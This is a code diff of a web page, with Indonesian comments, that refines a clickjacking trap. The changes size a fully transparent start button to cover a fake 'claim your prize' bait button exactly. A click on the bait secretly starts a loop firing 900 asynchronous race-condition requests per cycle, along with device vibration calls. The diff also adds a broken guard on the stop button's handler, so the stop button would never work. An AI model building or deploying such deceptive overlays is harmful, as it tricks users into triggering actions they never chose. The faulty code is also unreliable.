@@ -51,18 +51,19 @@
         }
 
         /* ======================================================== */
-        /* PERBAIKAN STRATEGI CLICKJACKING                          */
+        /* PENYEMPURNAAN STRATEGI CLICKJACKING                      */
         /* ======================================================== */
         .bait-box {
-            position: relative; /* Menjadi jangkar posisi untuk overlay */
+            position: relative; /* Menjadi jangkar posisi absolut untuk tombol transparan */
             margin: 20px 0;
-            padding: 20px;
+            padding: 0;         /* Diubah ke 0 agar overlay tombol menutupi 100% area tanpa celah */
             border: 2px dashed #333;
-            border-radius: 8px;
+            border-radius: 30px; /* Menyelaraskan kebulatan sudut wadah dengan tombol */
             background: #1a1a1e;
+            overflow: hidden;   /* Memastikan elemen transparan tidak bocor keluar batas */
         }
         
-        /* Umpan visual yang dilihat target */
+        /* Umpan visual yang dilihat oleh target */
         .fake-target-btn {
             background: #007bff;
             color: white;
@@ -75,16 +76,16 @@
             box-shadow: 0 4px 15px rgba(0,123,255,0.3);
         }
 
-        /* Tombol start asli yang disamarkan TEPAT di atas tombol hadiah */
+        /* Tombol start asli yang dimanipulasi agar menutup sempurna tepat di atas umpan */
         #startBtn {
             position: absolute;
-            top: 20px; /* Menyesuaikan padding dari .bait-box */
-            left: 20px;
-            width: calc(100% - 40px);
-            height: calc(100% - 40px);
+            top: 0;       /* Menempel mutlak di ujung atas wadah */
+            left: 0;      /* Menempel mutlak di ujung kiri wadah */
+            width: 100%;  /* Menutupi 100% lebar wadah umpan */
+            height: 100%; /* Menutupi 100% tinggi wadah umpan */
             background: transparent;
-            opacity: 0; /* Sepenuhnya transparan */
-            z-index: 99;
+            opacity: 0;   /* Sepenuhnya transparan (tak terlihat oleh mata) */
+            z-index: 99;  /* Berada di lapisan teratas agar memotong interaksi sentuhan */
             cursor: pointer;
             border: none;
         }
@@ -99,7 +100,7 @@
     <!-- Area Clickjacking Terisolasi -->
     <div class="bait-box">
         <div class="fake-target-btn">KLAIM HADIAH ANDA</div>
-        <!-- Tombol Start Asli Menimpa Tombol Palsu -->
+        <!-- Tombol Start Asli Menimpa Tombol Palsu secara Presisi -->
         <button id="startBtn"></button>
     </div>
 
@@ -125,7 +126,7 @@
 
     const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-    // Logika Race Condition bawaan Anda (900 iterasi)
+    // Logika Race Condition (900 iterasi asinkron)
     async function triggerRaceCondition() {
         let promises = [];
         for (let i = 0; i < 900; i++) {
@@ -159,7 +160,7 @@
             if (!isRunning) break;
 
             if (navigator.userActivation) {
-                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi: ` + navigator.userActivation.isActive);
+                writeLog(`Siklus #${loopCounter} - Status Aktivasi Resmi (isActive): ` + navigator.userActivation.isActive);
             }
 
             writeLog(`Siklus #${loopCounter} - Meluncurkan 900 Paket Race...`);
@@ -178,19 +179,19 @@
     // Pemicu Klik Tersembunyi
     startBtn.addEventListener('click', () => {
         if (!isRunning) {
-            startBtn.style.pointerEvents = 'none'; // Matikan klik tambahan agar tidak menumpuk error
+            startBtn.style.pointerEvents = 'none'; // Matikan klik tambahan agar tidak menumpuk instansi loop
             startTestingLoop();
         }
     });
 
     // Pemicu Stop Bersih
-    stopBtn.addEventListener('click', () => {
+    stopBtn.getElementById && stopBtn.addEventListener('click', () => {
         isRunning = false;
         if (navigator.vibrate) {
-            navigator.vibrate(0); // Batalkan semua perintah haptik aktif
+            navigator.vibrate(0); // Batalkan semua perintah haptik aktif di antrean perangkat keras
         }
         writeLog("🛑 Pengujian dihentikan. Memori dibersihkan.");
-        startBtn.style.pointerEvents = 'auto'; // Aktifkan kembali akses klik jika ingin tes ulang
+        startBtn.style.pointerEvents = 'auto'; // Mengembalikan kemampuan klik untuk pengujian ulang
     });
 </script>
 
